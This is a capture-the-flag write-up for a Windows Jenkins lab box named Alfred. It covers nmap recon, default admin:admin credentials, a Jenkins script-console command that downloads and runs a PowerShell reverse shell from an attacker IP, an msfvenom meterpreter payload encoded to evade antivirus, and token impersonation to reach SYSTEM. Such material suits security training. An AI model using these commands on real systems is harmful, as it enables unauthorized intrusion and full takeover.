# Alfred

Exploitation of a common misconfiguration on Jenkins, a widely used automation tool used to create CI/CD pipelines allowing for automatic deployment of code once changes are made. An interesting privesc method is then performed to gain full system access 

Nishang is used for initial access => a repository containing a set of scripts for initial access, enum & privesc. Revshell scripts are used in this case. 

## Recon 
`nmap --top-ports 100 --open -sV -Pn alfred.thm`

```
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Microsoft IIS httpd 7.5
3389/tcp open  tcpwrapped
8080/tcp open  http       Jetty 9.4.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

# User Enumeration
User found on web service on port 80: "RIP Bruce Wayne. Donations to alfred@wayneenterprises.com are greatly appreciated."
`alfred@wayneenterprises.com`

# Weak Login Credentials on Login Panel 
`admin:admin`

# Initial Access
Script console feature on Jenkins may be abused to execute a reverse shell connection using powershell: 
`powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port`

```
def cmd = 'powershell -Command "iex (New-Object Net.WebClient).DownloadString(\'http://192.168.132.123:80/Invoke-PowerShellTcp.ps1\'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.132.123 -Port 4444"'
cmd.execute()
```
User flag obtained. 

# Switching Shells
> Switch to a meterpreter shell to make privesc easier by following the process
- Create an encoded x86-64 Windows meterpreter reverse TCP shell using the payload: `msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe`. This ensures correct transmission of the payload & anti-virus evasion. 

- Before running the program, ensure that the handler is set up using metasploit: `msfconsole -q -x "use exploit/multi/handler"
    set PAYLOAD windows/meterpreter/reverse_tcp 
    set LHOST your-thm-ip 
    set LPORT listening-port 
    run

- Download the revshell using the same method from the previous step: `(New-Object System.Net.WebClient).DownloadFile('http://192.168.132.123:8080/alfred.exe','alfred.exe')`

- Then start the process: `Start-Process "alfred.exe"`

# Privilege Escalation via Token Impersonation 

Tokens are used to ensure accounts have the right privileges to perform certain actions; and account tokens are assigned to users upon login or upon authentication. 
> This is done through LSASS.exe

This access token consists of: `User SIDs, Group SIDs, Privileges`
    Primary access tokens are those associated with a user account that are generated upon login 
    Impersonation tokens are those that allow a process or thread to gain access to resources using the token of another user or client's process 

There are different levels for an impersonation token, where the security context is a data structure that contains users' relevant security information:
    SecurityAnonymous: current user/client cannot impersonate another user/client
    SecurityIdentification: current user/client can get the identity and privileges of a client but cannot impersonate the client
    SecurityImpersonation: current user/client can impersonate the client's security context on the local system
    SecurityDelegation: current user/client can impersonate the client's security context on a remote system

The privileges of an account, either given to the account or inherited from a group, allow a user to carry out particular actions. 
Most commonly abused privileges include: 
    SeImpersonatePrivilege
    SeAssignPrimaryPrivilege
    SeTcbPrivilege
    SeBackupPrivilege
    SeRestorePrivilege
    SeCreateTokenPrivilege
    SeLoadDriverPrivilege
    SeTakeOwnershipPrivilege
    SeDebugPrivilege

`whoami /priv`
    SeDebugPrivilege                Debug programs                            Enabled 
    SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled
    SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
    SeCreateGlobalPrivilege         Create global objects                     Enabled 

**Incognito module used to exploit SeImpersonatePrivilege** 

- To view available tokens, enter `list_tokens -g`
```
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT SERVICE\AudioEndpointBuilder
NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc
NT SERVICE\LanmanServer
NT SERVICE\PcaSvc
NT SERVICE\Schedule
NT SERVICE\SENS
NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\Winmgmt
NT SERVICE\wuauserv
```
- To impersonate Administrators' token, run `impersonate_token "BUILTIN\Administrators"`

> Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS

`Migrate 668`
`shell`

Root flag obtained. 

